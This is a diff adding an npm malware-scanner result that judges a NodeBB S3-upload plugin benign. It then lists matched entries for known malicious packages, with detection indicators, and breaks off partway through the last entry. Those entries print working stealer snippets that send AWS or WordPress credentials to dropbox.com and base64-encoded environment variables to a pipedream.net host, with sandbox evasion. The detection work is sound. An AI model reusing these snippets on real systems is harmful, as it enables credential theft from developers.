@@ -1,0 +1,492 @@
+{
+  "package_name": "nodebb-plugin-s3-uploads",
+  "package_version": "0.3.3",
+  "label": "benign",
+  "detection_time": "2026-05-26T19:24:02.860857",
+  "status": "success",
+  "selected_files_count": 2,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js"
+  ],
+  "is_malicious": false,
+  "total_files": 2,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/nodebb-plugin-s3-uploads/0.3.3/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/nodebb-plugin-s3-uploads/0.3.3/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "var Package = require(\"./package.json\");\n\nvar AWS = require('aws-sdk'),\n    mime = require(\"mime\"),\n    uuid = require(\"uuid\").v4,\n    fs = require('fs'),\n    request = require('request'),\n    path = require('path'),\n    winston = module.parent.require('winston'),\n    gm = module.parent.require('gm').subClass({imageMagick: true}),\n    meta = module.parent.require('./meta'),\n    db = module.parent.require('./database');\n\n(function(plugin) {\n  \"use strict\";\n\n  var S3Conn = null;\n  var settings = {\n    \"accessKeyId\": false,\n    \"secretAccessKey\": false,\n    \"bucket\": process.env.S3_UPLOADS_BUCKET || undefined,\n    \"host\": process.env.S3_UPLOADS_HOST || undefined,\n    \"path\": process.env.S3_UPLOADS_PATH || undefined\n  };\n\n  var accessKeyIdFromDb = false;\n  var secretAccessKeyFromDb = false;\n\n  var adminRoute = '/admin/plugins/s3-uploads';\n\n  function fetchSettings(callback){\n    db.getObjectFields(Package.name, Object.keys(settings), function(err, newSettings){\n      if (err) {\n        winston.error(err.message);\n        if (typeof callback === 'function') {\n          callback(err);\n        }\n        return;\n      }\n\n      accessKeyIdFromDb = false;\n      secretAccessKeyFromDb = false;\n\n      if(newSettings.accessKeyId){\n        settings.accessKeyId = newSettings.accessKeyId;\n        accessKeyIdFromDb = true;\n      }else{\n        settings.accessKeyId = false;\n      }\n\n      if(newSettings.secretAccessKey){\n        settings.secretAccessKey = newSettings.secretAccessKey;\n        secretAccessKeyFromDb = false;\n      }else{\n        settings.secretAccessKey = false;\n      }\n\n      if(!newSettings.bucket){\n        settings.bucket = process.env.S3_UPLOADS_BUCKET || \"\";\n      }else{\n        settings.bucket = newSettings.bucket;\n      }\n\n      if(!newSettings.host){\n        settings.host = process.env.S3_UPLOADS_HOST || \"\";\n      }else{\n        settings.host = newSettings.host;\n      }\n\n      if(!newSettings.path){\n        settings.path = process.env.S3_UPLOADS_PATH || \"\";\n      }else{\n        settings.path = newSettings.path;\n      }\n\n      if(settings.accessKeyId && settings.secretAccessKey){\n        AWS.config.update({\n          accessKeyId: settings.accessKeyId,\n          secretAccessKey: settings.secretAccessKey\n        });\n      }\n\n      if (typeof callback === 'function') {\n        callback();\n      }\n    });\n  }\n\n  function S3(){\n    if(!S3Conn){\n      S3Conn = new AWS.S3();\n    }\n\n    return S3Conn;\n  }\n\n  function makeError(err){\n    if(err instanceof Error){\n      err.message = Package.name + \" :: \" + err.message;\n    }else{\n      err = new Error(Package.name + \" :: \" + err);\n    }\n\n    winston.error(err.message);\n    return err;\n  }\n\n  plugin.activate = function(){\n    fetchSettings();\n  };\n\n  plugin.deactivate = function(){\n    S3Conn = null;\n  };\n\n  plugin.load = function(params, callback){\n    fetchSettings(function(err) {\n      if (err) {\n        return winston.error(err.message);\n      }\n\n      params.router.get(adminRoute, params.middleware.applyCSRF, params.middleware.admin.buildHeader, renderAdmin);\n      params.router.get('/api' + adminRoute, params.middleware.applyCSRF, renderAdmin);\n\n      params.router.post('/api' + adminRoute + '/s3settings', s3settings);\n      params.router.post('/api' + adminRoute + '/credentials', credentials);\n\n      callback();\n    });\n  };\n\n  function renderAdmin(req, res) {\n    // Regenerate csrf token\n    var token = req.csrfToken();\n\n    var data = {\n      bucket: settings.bucket,\n      host: settings.host,\n      path: settings.path,\n      accessKeyId: (accessKeyIdFromDb && settings.accessKeyId) || '',\n      secretAccessKey: (accessKeyIdFromDb && settings.secretAccessKey) || '',\n      csrf: token\n    };\n\n    res.render('admin/plugins/s3-uploads', data);\n  }\n\n  function s3settings(req, res, next) {\n    var data = req.body;\n    var newSettings = {\n      bucket: data.bucket || '',\n      host: data.host || '',\n      path: data.path || ''\n    };\n\n    saveSettings(newSettings, res, next);\n  }\n\n  function credentials(req, res, next) {\n    var data = req.body;\n    var newSettings = {\n      accessKeyId: data.accessKeyId || '',\n      secretAccessKey: data.secretAccessKey || ''\n    };\n\n    saveSettings(newSettings, res, next);\n  }\n\n  function saveSettings(settings, res, next) {\n    db.setObject(Package.name, settings, function(err) {\n      if (err) {\n        return next(makeError(err));\n      }\n\n      fetchSettings();\n      res.json('Saved!');\n    });\n  }\n\n  plugin.uploadImage = function (data, callback) {\n    var image = data.image;\n\n    if (!image) {\n      return callback(new Error('invalid image'));\n    }\n\n    var type = image.url ? 'url' : 'file';\n\n    if (type === 'file') {\n      if (!image.path) {\n        return callback(new Error('invalid image path'));\n      }\n\n      fs.readFile(image.path, function(err, buffer) {\n        uploadToS3(image.name, err, buffer, callback);\n      });\n    }\n    else {\n      var filename = image.url.split('/').pop();\n\n      var imageDimension = parseInt(meta.config.profileImageDimension, 10) || 128;\n\n      // Resize image.\n      gm(request(image.url), filename)\n        .resize(imageDimension + \"^\", imageDimension + \"^\")\n        .stream(function(err, stdout, stderr) {\n          if (err) {\n            return callback(makeError(err));\n          }\n\n          // This is sort of a hack - We're going to stream the gm output to a buffer and then upload.\n          // See https://github.com/aws/aws-sdk-js/issues/94\n          var buf = new Buffer(0);\n          stdout.on('data', function(d) {\n            buf = Buffer.concat([buf, d]);\n          });\n          stdout.on('end', function() {\n            uploadToS3(filename, null, buf, callback);\n          });\n        }\n      );\n    }\n  };\n\n  plugin.uploadFile = function (data, callback) {\n    var file = data.file;\n\n    if (!file) {\n      return callback(new Error('invalid file'));\n    }\n\n    if (!file.path) {\n      return callback(new Error('invalid file path'));\n    }\n\n    fs.readFile(file.path, function(err, buffer) {\n      uploadToS3(file.name, err, buffer, callback);\n    });\n  };\n\n  function uploadToS3(filename, err, buffer, callback) {\n    if (err) {\n      return callback(makeError(err));\n    }\n\n    var s3Path;\n    if (settings.path && 0 < settings.path.length) {\n      s3Path = settings.path;\n\n      if (!s3Path.match(/\\/$/)) {\n        // Add trailing slash\n        s3Path = s3Path + '/';\n      }\n    }\n    else {\n      s3Path = '/';\n    }\n\n    var s3KeyPath = s3Path.replace(/^\\//, ''); // S3 Key Path should not start with slash.\n\n    var params = {\n      Bucket: settings.bucket,\n      ACL: \"public-read\",\n      Key: s3KeyPath + uuid() + path.extname(filename),\n      Body: buffer,\n      ContentLength: buffer.length,\n      ContentType: mime.lookup(filename)\n    };\n\n    S3().putObject(params, function(err) {\n      if (err) {\n        return callback(makeError(err));\n      }\n\n      var s3Host;\n      if (settings.host && 0 < settings.host.length) {\n        s3Host = settings.host;\n\n        if (!s3Host.match(/\\/$/)) {\n          // Add trailing slash\n          s3Host = s3Host + '/';\n        }\n      }\n      else {\n        s3Host = params.Bucket + \".s3.amazonaws.com/\";\n      }\n\n      callback(null, {\n        name: filename,\n        // Use protocol-less urls so that both HTTP and HTTPS work:\n        url: \"//\" + s3Host + params.Key\n      });\n    });\n  }\n\n  var admin = plugin.admin =  {};\n\n  admin.menu = function(headers, callback) {\n    headers.plugins.push({\n      \"route\": '/plugins/s3-uploads',\n      \"icon\": 'fa-picture-o',\n      \"name\": 'S3 Uploads'\n    });\n\n    callback(null, headers);\n  };\n\n}(module.exports));",
+          "is_malicious": false,
+          "malice_score": 0.5519286751747131,
+          "confidence": 0.1,
+          "behavior_summary": "At import-time and during plugin activation and API calls, the code accesses AWS credentials from environment variables and database storage, then configures the AWS SDK with these credentials. It reads local files or fetches images from external URLs, processes them (including resizing via ImageMagick), and uploads the resulting data to Amazon S3 buckets using the AWS SDK's putObject API. The code constructs S3 object keys and URLs dynamically based on settings and environment variables, enabling file exfiltration or storage to potentially attacker-controlled S3 buckets if credentials or bucket names are manipulated.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a plugin designed to upload images and files to Amazon S3 buckets using AWS SDK. It reads AWS credentials from environment variables or a database, configures the AWS SDK, processes images (including resizing), and uploads them to S3. While it handles sensitive credentials and performs network operations, it does so transparently and with clear intent to provide S3 upload functionality. There is no evidence of credential exfiltration, obfuscated code, or unauthorized data transmission to attacker-controlled domains. The known malicious patterns involve explicit credential theft and exfiltration to external domains without user consent, which is not present here. The use of AWS SDK and file system APIs is legitimate and expected for this functionality. Therefore, despite handling sensitive data, the code does not exhibit malicious behavior.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20250102_111622_780168_snippet_1",
+              "source_package": "0xengine/xmlrpc (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_780168/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.558032751083374,
+              "code_similarity": 0.4770141839981079,
+              "behavior_similarity": 0.6390513181686401,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const fs = require('fs');\nconst https = require('https');\nconst creds = fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8');\nhttps.request({hostname: 'dropbox.com', path: '/upload', method: 'POST'}, req => req.end(creds));",
+                "code_behavior": "At runtime, the code reads AWS credentials from the local filesystem, transmits them via an HTTPS POST request to dropbox.com, resulting in unauthorized credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses the user's AWS credentials file and sends its contents to an external domain (dropbox.com) without user knowledge or consent, which is a clear indicator of infostealer malware.",
+                  "violated_expectations": "A legitimate npm package should never access or transmit sensitive credential files such as ~/.aws/credentials without explicit user consent and a valid, transparent purpose.",
+                  "similar_legitimate_use": "Automated backup tools may upload credentials to a secure, organization-controlled vault, but never to public file-sharing services like Dropbox.",
+                  "key_indicators": [
+                    "Reads ~/.aws/credentials file",
+                    "Initiates outbound HTTPS POST to dropbox.com/upload",
+                    "No user interaction or consent required",
+                    "Hardcoded external destination for sensitive data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "package.json (npm package entry point)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "0xengine/xmlrpc",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (all versions in trojanized repos)",
+                  "why_malicious": "The package is a trojanized dependency distributed via fake GitHub repositories and phishing campaigns. It contains code that steals sensitive credentials (WordPress, SSH, AWS), exfiltrates them to attacker-controlled infrastructure (Dropbox, file.io), and deploys additional payloads such as cryptocurrency miners and backdoors. The malicious behaviors are embedded in the package entry point and in a downloaded second-stage payload, enabling credential theft, remote code execution, and persistent compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim downloads and installs a trojanized npm package (0xengine/xmlrpc) from a fake GitHub repository or via phishing.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on victim's machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious npm package executes code to steal credentials (WordPress, SSH, AWS) and exfiltrate them to Dropbox.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Initial data exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious package downloads and executes a second-stage payload (xmrdropper) from codeberg.org.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Deployment of additional malware"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Second-stage payload collects further data (e.g., shell history) and exfiltrates it to file.io.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Extended data exfiltration and persistence"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package accessing sensitive files such as ~/.aws/credentials, ~/.ssh/id_rsa, or ./wordpress_creds.txt",
+                    "npm package making outbound HTTPS POST requests to dropbox.com/upload or file.io",
+                    "Execution of remote shell scripts fetched from codeberg.org or similar untrusted platforms",
+                    "Creation and exfiltration of temporary files containing shell history or environment variables"
+                  ],
+                  "file_indicators": [
+                    "Presence of 0xengine/xmlrpc in node_modules directory",
+                    "Unexpected access to ~/.aws/credentials, ~/.ssh/id_rsa, or ./wordpress_creds.txt by npm processes",
+                    "Creation of /tmp/.hist file containing shell history"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to dropbox.com/upload",
+                    "Outbound file uploads to file.io via curl",
+                    "Connections to codeberg.org for remote script downloads"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for unexpected access to sensitive files such as AWS credentials, SSH keys, or WordPress credentials. Flag any npm package that initiates outbound connections to dropbox.com, file.io, or codeberg.org. Detect execution of shell scripts fetched from remote sources, especially those using curl piped to bash. Alert on exfiltration of shell history or environment variables to public file-sharing services. Correlate file creation events (e.g., /tmp/.hist) with network uploads to identify data theft."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_780168_snippet_3",
+              "source_package": "0xengine/xmlrpc (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_780168/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5506056547164917,
+              "code_similarity": 0.46990346908569336,
+              "behavior_similarity": 0.63130784034729,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "const fs = require('fs');\nconst https = require('https');\nconst wpCreds = fs.readFileSync('./wordpress_creds.txt', 'utf8');\nhttps.request({hostname: 'dropbox.com', path: '/upload', method: 'POST'}, req => req.end(wpCreds));",
+                "code_behavior": "At runtime, the code reads WordPress credentials from a local file and exfiltrates them to dropbox.com via HTTPS POST, resulting in theft of website authentication data.",
+                "malice_analysis": {
+                  "why_suspicious": "Stealing and exfiltrating WordPress credentials is a clear sign of credential theft, potentially enabling further compromise of web assets.",
+                  "violated_expectations": "A credentials checker or utility should only validate credentials locally and never transmit them externally.",
+                  "similar_legitimate_use": "No legitimate package should transmit WordPress credentials to a third-party service.",
+                  "key_indicators": [
+                    "Reads ./wordpress_creds.txt file",
+                    "Sends credentials to dropbox.com/upload",
+                    "No user awareness or approval"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "package.json (npm package entry point)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "0xengine/xmlrpc",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (all versions in trojanized repos)",
+                  "why_malicious": "The package is a trojanized dependency distributed via fake GitHub repositories and phishing campaigns. It contains code that steals sensitive credentials (WordPress, SSH, AWS), exfiltrates them to attacker-controlled infrastructure (Dropbox, file.io), and deploys additional payloads such as cryptocurrency miners and backdoors. The malicious behaviors are embedded in the package entry point and in a downloaded second-stage payload, enabling credential theft, remote code execution, and persistent compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim downloads and installs a trojanized npm package (0xengine/xmlrpc) from a fake GitHub repository or via phishing.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on victim's machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious npm package executes code to steal credentials (WordPress, SSH, AWS) and exfiltrate them to Dropbox.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Initial data exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious package downloads and executes a second-stage payload (xmrdropper) from codeberg.org.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Deployment of additional malware"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Second-stage payload collects further data (e.g., shell history) and exfiltrates it to file.io.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Extended data exfiltration and persistence"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package accessing sensitive files such as ~/.aws/credentials, ~/.ssh/id_rsa, or ./wordpress_creds.txt",
+                    "npm package making outbound HTTPS POST requests to dropbox.com/upload or file.io",
+                    "Execution of remote shell scripts fetched from codeberg.org or similar untrusted platforms",
+                    "Creation and exfiltration of temporary files containing shell history or environment variables"
+                  ],
+                  "file_indicators": [
+                    "Presence of 0xengine/xmlrpc in node_modules directory",
+                    "Unexpected access to ~/.aws/credentials, ~/.ssh/id_rsa, or ./wordpress_creds.txt by npm processes",
+                    "Creation of /tmp/.hist file containing shell history"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to dropbox.com/upload",
+                    "Outbound file uploads to file.io via curl",
+                    "Connections to codeberg.org for remote script downloads"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for unexpected access to sensitive files such as AWS credentials, SSH keys, or WordPress credentials. Flag any npm package that initiates outbound connections to dropbox.com, file.io, or codeberg.org. Detect execution of shell scripts fetched from remote sources, especially those using curl piped to bash. Alert on exfiltration of shell history or environment variables to public file-sharing services. Correlate file creation events (e.g., /tmp/.hist) with network uploads to identify data theft."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_195356_370783_snippet_1",
+              "source_package": "epic-ue-loading (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_195356_370783/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5484303832054138,
+              "code_similarity": 0.49852871894836426,
+              "behavior_similarity": 0.5983320474624634,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "var data = process.env || {};\nif (\n  filter.some((entry) =>\n    [].concat(entry).every((item) => (data[item.key] || '').includes(item.val) || item.val === '*')\n  ) ||\n  Object.keys(data).length < 10\n) {\n  return;\n}\nvar req = http.request({\n  host: ['eoxb1lay4m45mms', 'm', ['pip', 'edream'].join(''), 'net'].join('.'),\n  path: '/' + (data.npm_package_name || ''),\n  method: 'POST',\n});\nreq.write(Buffer.from(JSON.stringify(data).toString('base64')));\nreq.end();",
+                "code_behavior": "At import-time or runtime, the code collects all environment variables, checks for sandbox indicators, and if not detected, sends the environment data via HTTP POST to a hardcoded attacker-controlled domain, resulting in exfiltration of sensitive credentials and secrets.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses all environment variables and exfiltrates them to an external, attacker-controlled domain using an HTTP POST request. The use of base64 encoding and obfuscated domain construction, combined with sandbox evasion logic, is characteristic of credential theft and data exfiltration malware.",
+                  "violated_expectations": "Legitimate package code should not access or transmit all environment variables, nor should it communicate with external domains without explicit user consent and clear documentation. Exfiltrating sensitive data to an untrusted domain is a direct violation of user trust and security best practices.",
+                  "similar_legitimate_use": "Some legitimate telemetry or crash reporting tools may send limited, non-sensitive environment data to trusted domains, but they never transmit full environment dumps or send data to untrusted or obfuscated domains.",
+                  "key_indicators": [
+                    "Access to process.env (all environment variables)",
+                    "HTTP POST request to a hardcoded, attacker-controlled domain",
+                    "Base64 encoding of environment data prior to transmission",
+                    "Obfuscated domain construction using array joins",
+                    "Conditional execution based on sandbox detection"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "build.js (in malicious versions, e.g., epic-ue-loading/1.803.0/build.js)",
+                  "required_permissions": [
+                    "environment_vars",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "epic-ue-loading",
+                  "package_manager": "npm",
+                  "package_versions": "1.803.0, 2.802.0, 3.801.0, 4.800.0, 5.799.0, 6.798.0, 7.797.0, 8.796.0, 9.795.0 (malicious); 0.1.0 (benign)",
+                  "why_malicious": "Multiple versions of the package contain code that collects all environment variables from the victim machine and exfiltrates them to an attacker-controlled webhook using HTTP POST requests. The code employs sandbox and analysis environment detection to evade automated security scanners. The latest version (0.1.0) is benign, likely to avoid detection by scanners that only analyze the most recent release."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed as a dependency due to dependency confusion and unpinned versioning.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on victim machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "On import or runtime, code checks for sandbox or analysis environment using environment variable filters.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "If not a sandbox, proceed to exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "If not in a sandbox, code collects all environment variables and sends them to an attacker-controlled webhook via HTTP POST.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive environment data (secrets, tokens, credentials)"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to all environment variables (process.env) at import-time or runtime",
+                    "HTTP POST requests to hardcoded external domains, especially pipedream.net subdomains",
+                    "Base64 encoding of environment data prior to exfiltration",
+                    "Presence of large environment variable filter lists for sandbox or analysis environment detection",
+                    "Obfuscated domain and filter construction using array joins"
+                  ],
+                  "file_indicators": [
+                    "build.js containing process.env access and HTTP request logic",
+                    "Obfuscated or double-obfuscated JavaScript files in non-latest versions",
+                    "Multiple package versions with high minor/patch numbers and a benign latest version",
+                    "Presence of large filter arrays in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "Connections to *.m.pipedream.net domains (e.g., eoxb1lay4m45mms.m.pipedream.net)",
+                    "Outbound HTTP POST requests during package installation or import"
+                  ],
+                  "how_to_detect": "Monitor for packages that access and exfiltrate environment variables, especially those making HTTP POST requests to known malicious domains such as pipedream.net subdomains. Flag packages containing large environment variable filter lists or obfuscated code in build.js or similar files. Pay special attention to packages with multiple high-numbered versions and a benign latest version, as this is a common evasion technique. Use both static and dynamic analysis to inspect all package versions, not just the latest, and correlate network activity with package installation or import events."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102818_710202_snippet_1",
+              "source_package": "epic-ue-loading (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102818_710202/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5472711324691772,
+              "code_similarity": 0.4986812472343445,
+              "behavior_similarity": 0.5958609580993652,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "var data = process.env || {};\nif (\n  filter.some((entry) =>\n    [].concat(entry).every((item) => (data[item.key] || '').includes(item.val) || item.val === '*')\n  ) ||\n  Object.keys(data).length < 10\n) {\n  return;\n}\nvar req = http.request({\n  host: ['eoxb1lay4m45mms', 'm', ['pip', 'edream'].join(''), 'net'].join('.'),\n  path: '/' + (data.npm_package_name || ''),\n  method: 'POST',\n});\nreq.write(Buffer.from(JSON.stringify(data).toString('base64')));\nreq.end();",
+                "code_behavior": "At import-time or runtime, the code collects all environment variables from process.env, checks for sandbox indicators using a filter, and if not detected, exfiltrates the environment data via a POST request to a dynamically constructed, attacker-controlled domain, resulting in credential and secret theft.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses all environment variables and exfiltrates them to an external, obfuscated domain without user consent. The use of dynamic hostname construction and base64 encoding, combined with conditional logic to avoid sandboxes, is characteristic of data theft malware.",
+                  "violated_expectations": "Legitimate packages do not exfiltrate environment variables or send sensitive data to external webhooks, especially not at import-time or without explicit user consent. Telemetry or error reporting would be opt-in, clearly documented, and not obfuscated.",
+                  "similar_legitimate_use": "Some legitimate packages may collect environment data for debugging or telemetry, but only with user consent and transparent documentation. They do not obfuscate hostnames or exfiltrate all environment variables.",
+                  "key_indicators": [
+                    "Access to process.env and exfiltration of all environment variables",
+                    "Obfuscated and dynamically constructed webhook host using string concatenation",
+                    "Base64 encoding of exfiltrated data",
+                    "Network POST request to attacker-controlled domain at import-time",
+                    "Conditional logic to avoid execution in sandboxes"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "build.js (main entry point in malicious versions)",
+                  "required_permissions": [
+                    "environment_vars",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "epic-ue-loading",
+                  "package_manager": "npm",
+                  "package_versions": "1.803.0, 2.802.0, 3.801.0, 4.800.0, 5.799.0, 6.798.0, 7.797.0, 8.796.0, 9.795.0 (malicious); 0.1.0 (benign)",
+                  "why_malicious": "Multiple versions of the package exfiltrate all environment variables to an attacker-controlled webhook, use obfuscated and dynamically constructed hostnames, and implement sandbox evasion techniques to avoid detection. The latest version (0.1.0) is benign to bypass security scanners, while the majority of versions are malicious and designed for dependency confusion attacks targeting build and CI/CD environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed as a dependency due to dependency confusion, leveraging high minor/patch version numbers to supersede internal packages.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on the victim machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "On import or runtime, the code checks environment variables for known sandbox, CI/CD, or analysis indicators to evade detection.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "If not a sandbox or analysis environment, proceeds to data exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collects all environment variables from the victim machine using process.env.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Prepares sensitive data for exfiltration"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Exfiltrates the collected environment variables to an attacker-controlled webhook using a POST request to a dynamically constructed subdomain.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive credentials and secrets from the victim environment"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to process.env and exfiltration of all environment variables to external domains",
+                    "Network POST requests to dynamically constructed subdomains of pipedream.net at import-time or runtime",
+                    "Conditional logic to evade sandboxes or CI/CD environments based on environment variable checks",
+                    "Obfuscated or programmatically constructed hostnames and filter lists in JavaScript code"
+                  ],
+                  "file_indicators": [
+                    "build.js containing both process.env access and http.request usage",
+                    "Obfuscated or minified code in non-production npm packages",
+                    "Presence of large, programmatically constructed filter lists for environment variable checks in build.js"
+                  ],
+                  "network_indicators": [
+                    "*.m.pipedream.net",
+                    "POST requests to subdomains such as eoxb1lay4m45mms.m.pipedream.net"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access all environment variables and send them to external domains, especially at import-time or during installation. Flag packages with obfuscated or dynamically constructed code, large environment variable filter lists, or network requests to known exfiltration domains such as *.m.pipedream.net. Use both static and dynamic analysis to inspect all package versions, not just the latest, and correlate build.js file contents with suspicious network activity."
+                }
+              }
+            },
+            {
+              "match_id": "20250105_195714_455833_snippet_2",
+              "source_package": "PuTTY (weaponized variant), RealVNC (weaponized variant), coa, rc, ua-parser-js (Direct distribution (executables), npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_455833/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5465103387832642,
+              "code_similarity": 0.42529234290122986,
+              "behavior_similarity": 0.6677283644676208,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "[Obfuscated JavaScript code in the entrypoint of hijacked npm packages, not shown in report. The code reads process.env for variables like NPM_TOKEN, AWS_ACCESS_KEY_ID, and sends them via HTTP POST to attacker-controlled domains.]",
+                "code_behavior": "At import-time or runtime, the code reads sensitive environment variables such as NPM_TOKEN, AWS_ACCESS_KEY_ID, and AWS_SECRET_ACCESS_KEY, then sends their values via HTTP POST requests to a hardcoded attacker-controlled domain, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "Legitimate npm packages do not access and exfiltrate environment variables containing credentials to external servers. The presence of obfuscated code in the entrypoint and network requests to untrusted domains is highly suspicious.",
+                  "violated_expectations": "Normal behavior is to provide utility functions as described in documentation, without accessing or transmitting sensitive environment variables. The malicious code exfiltrates secrets, violating user trust and package intent.",
+                  "similar_legitimate_use": "Some packages may collect telemetry or crash reports with user consent, but never transmit authentication tokens or cloud credentials.",
+                  "key_indicators": [
+                    "Obfuscated or minified code in package entrypoint (index.js)",
+                    "Network requests to hardcoded, untrusted domains during install or import",
+                    "Access to environment variables unrelated to package functionality",
+                    "HTTP POST payloads containing credential-like data"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or runtime (npm package installation or use)",
+                  "file_location": "index.js or main entrypoint of hijacked npm packages (coa@2.0.3, 2.0.4, 2.1.1; rc@1.2.9; ua-parser-js@0.7.29, 0.8.0, 1.0.0)",
+                  "required_permissions": [
+                    "network (outbound HTTP/S requests)",
+                    "filesystem (read access to environment and config files)",
+                    "environment_vars (read sensitive environment variables)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "PuTTY (weaponized variant), RealVNC (weaponized variant), coa, rc, ua-parser-js",
+                  "package_manager": "Direct distribution (executables), npm",
+                  "package_versions": "Unknown for PuTTY/RealVNC; coa: 2.0.3, 2.0.4, 2.1.1; rc: 1.2.9; ua-parser-js: 0.7.29, 0.8.0, 1.0.0",
+                  "why_malicious": "These packages and executables were modified by threat actors to include malicious code that, when executed, establishes persistence, enables unauthorized remote access, and facilitates further malware deployment or data exfiltration. Attackers exploited the trust in widely used open source tools and npm packages to distribute malware at scale, targeting both end users and development environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
